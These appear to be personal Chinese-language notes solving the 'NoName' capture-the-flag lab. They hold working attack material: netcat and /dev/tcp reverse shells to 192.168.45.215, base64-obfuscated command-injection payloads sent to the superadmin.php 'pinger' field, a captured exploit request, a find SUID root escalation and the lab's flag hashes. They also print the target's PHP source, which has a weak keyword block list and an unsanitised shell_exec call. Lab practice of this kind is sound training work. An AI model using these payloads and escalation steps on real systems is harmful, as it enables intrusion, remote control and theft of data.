参考资料：  
[https://medium.com/@Inching-Towards-Intelligence/pg-play-noname-e9504220ae31](https://medium.com/@Inching-Towards-Intelligence/pg-play-noname-e9504220ae31)
   

参考2：https://bing0o.github.io/posts/pg-noname/
   

反向shell学习  
[https://forum.butian.net/share/2900](https://forum.butian.net/share/2900)
      

源代码解析  
[https://medium.com/@Inching-Towards-Intelligence/pg-play-noname-e9504220ae31](https://medium.com/@Inching-Towards-Intelligence/pg-play-noname-e9504220ae31)
   

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\>&1|nc 192.168.45.215 443 \>/tmp/f
 
echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\>&1|nc 192.168.45.215 443 \>/tmp/f'| base64 -d
   

cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxNSA0NDMgPi90bXAvZg==
    
pinger=127.0.0.1+|echo+-n+"ccm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxNSA0NDMgPi90bXAvZg=="+|+base64+-d+|bash&submitt=Submit+Query
    
pinger=127.0.0.1+|echo+-n+"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxNSA0NDMgPi90bXAvZg=="+|+base64+-d+|bash&submitt=Submit+Query
      

L2Jpbi9iYXNoICAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguNDUuMjE1IDQ0MyAwPCYxIDI+JjE=
    
/bin/bash -i \> /dev/tcp/192.168.45.215 443 0\<&1 2\>&1
      

pinger=||netcat+192.168.45.219+9090|`which+bash`&submitt=Submit+Query
          
shujubao  
POST /superadmin.php HTTP/1.1  
Host: 192.168.233.15  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 129  
Origin: [http://192.168.233.15](http://192.168.233.15)  
Connection: keep-alive  
Referer: [http://192.168.233.15/superadmin.php](http://192.168.233.15/superadmin.php)  
Upgrade-Insecure-Requests: 1
 
pinger=127.0.0.1+|echo+-n+"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxNSA0NDMgPi90bXAvZg=="+|+base64+-d+|bash&submitt=Submit+Query
    
diyige
 
53b0b960430b570d27d42ca3dcf780de
    
tiquan  
www-data@haclabs:/home/yash$ find . -exec /bin/sh -p \; -quit  
find . -exec /bin/sh -p \; -quit  
id  
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)  
cd /root  
ls  
flag3.txt  
proof.txt  
cat proof.txt  
64b6ef2e789218816fc9a382862170ac
      

index.php  
www-data@haclabs:/var/www/html$ cat index.php  
cat index.php  
\<h4\>Fake Admin Area\</h4\>  
\<form action="index.php" method="post"\>  
\<input type="text" placeholder="fake query" name="box"\>  
\<input type="submit" placeholder="Run" value="submit" name="submitt"\>  
\</form\>
 
\<?php  
if (isset($_POST['submitt']))  
{  
echo "Fake ping executed";  
}  
?\>
 
www-data@haclabs:/var/www/html$
   

www-data@haclabs:/var/www/html$ cat superadmin.php  
cat superadmin.php  
\<form method="post" action=""\>  
\<input type="text" placeholder="Enter an IP to ping" name="pinger"\>  
\<br\>  
\<input type="submit" name="submitt"\>  
\</form\>
 
\<?php  
if (isset($_POST['submitt']))  
{  
$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");  
$pinged=$_POST['pinger'];  
$newStr = str_replace($word, "", $pinged);  
if(strcmp($pinged, $newStr) == 0)  
{  
$flag=1;  
}  
else  
{  
$flag=0;  
}  
}
 
if ($flag==1){  
$outer=shell_exec("ping -c 3 $pinged");  
echo "\<pre\>$outer\</pre\>";  
}  
?\>
   

www-data@haclabs:/var/www/html$
       
dierge  
64b6ef2e789218816fc9a382862170ac